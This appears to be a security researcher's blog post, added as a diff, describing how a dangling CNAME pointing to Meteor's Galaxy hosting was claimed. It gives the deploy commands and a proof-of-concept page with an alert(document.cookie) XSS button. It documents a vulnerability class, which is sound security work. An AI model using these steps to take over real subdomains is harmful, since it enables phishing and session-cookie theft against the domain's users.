@@ -1,0 +1,94 @@
+---
+layout: post
+title:  "Meteor cloud subdomain takeover"
+date:   2022-12-02 17:28:10 +0500
+categories: blog
+---
+While scanning my automation system found subdomain whose cname record pointed to **eu-west-1.galaxy-ingress.meteor.com** with a 404 response code.
+
+```404 Not Found: No applications registered for host '***.*****.***'.```
+
+![meteor response](/assets/meteor/response.png)
+
+It's looks like subdomain takeover is possible here :)
+
+[www.meteor.com](https://www.meteor.com/) says that
+
+```Meteor is an open source platform for seamlessly building and deploying Web, Mobile, and Desktop applications in Javascript.```
+
+After registering an account is necessary to add payment method under settings → billing,  because custom subdomain can be used only with non free application instances.
+
+![meteor biling](/assets/meteor/billing.png)
+
+Most simple way to deploy your application to meteor cloud is to use meteor cli tool [https://docs.meteor.com/install.html](https://docs.meteor.com/install.html)
+
+After installing, we can create new meteor application, I advise to use minimal template, because only minimal template doesn't have mongodb dependency:
+
+{% highlight bash %}
+rival@meteor-takeover % meteor create --minimal .
+Created a new Meteor app in current directory.
+
+To run your new app:                          
+  meteor                                      
+                                              
+If you are new to Meteor, try some of the learning resources here:
+  https://www.meteor.com/tutorials            
+                                              
+When you’re ready to deploy and host your new Meteor application, check out Cloud:
+  https://www.meteor.com/cloud                
+                                              
+To start with a different app template, try one of the following:
+...
+{% endhighlight %}
+
+Meteor will create all the necessary files for us.
+
+The files located in the client directory are setting up your client side (web), you can see for example **client/main.html** where we can change html to something more appropriate, like this with xss payload:
+
+{% highlight html %}
+<head>
+  <title>Rivalsec meteor takeover</title>
+</head>
+<body>
+  <h1>Rivalsec meteor takeover </h1>
+  <p>
+    if the subdomain takeover is successful, a wide variety of attacks are possible (serving malicious content, phishing, stealing user session cookies, credentials, etc.).
+  </p>
+  <button onclick="alert(document.cookie);">Click me for XSS</button>
+</body>
+{% endhighlight %}
+
+![meteor biling](/assets/meteor/appfiles.png)
+
+Now we can login and deploy our app:
+
+**DEPLOY_HOSTNAME** must be same as subdomains cname
+
+{% highlight raw %}
+rival@meteor-takeover % meteor login                                                                                            
+Username: rivalsec
+Password:                                     
+                                              
+Logged in as rivalsec. Thanks for being a Meteor developer!
+
+rival@meteor-takeover % DEPLOY_HOSTNAME=eu-west-1.galaxy.meteor.com meteor deploy ***.*****.***
+Talking to Galaxy servers at https://eu-west-1.galaxy.meteor.com
+Preparing to build your app...                
+Browserslist: caniuse-lite is outdated. Please run:
+  npx browserslist@latest --update-db
+  Why you should do it regularly: https://github.com/browserslist/browserslist#browsers-data-updating
+Preparing to upload your app...               
+Uploaded app bundle for new app at ***.*****.***.
+Galaxy is building the app into a native image.
+Waiting for deployment updates from Galaxy... 
+Building app image...                         
+Deploying app...                              
+You have successfully deployed the first version of your app.
+For details, visit https://eu-west-1.galaxy.meteor.com/app/***.*****.***
+{% endhighlight %}
+
+
+Meteor will deploy application and receive new https certificate for our subdomain.
+
+![meteor biling](/assets/meteor/succes.png)
+
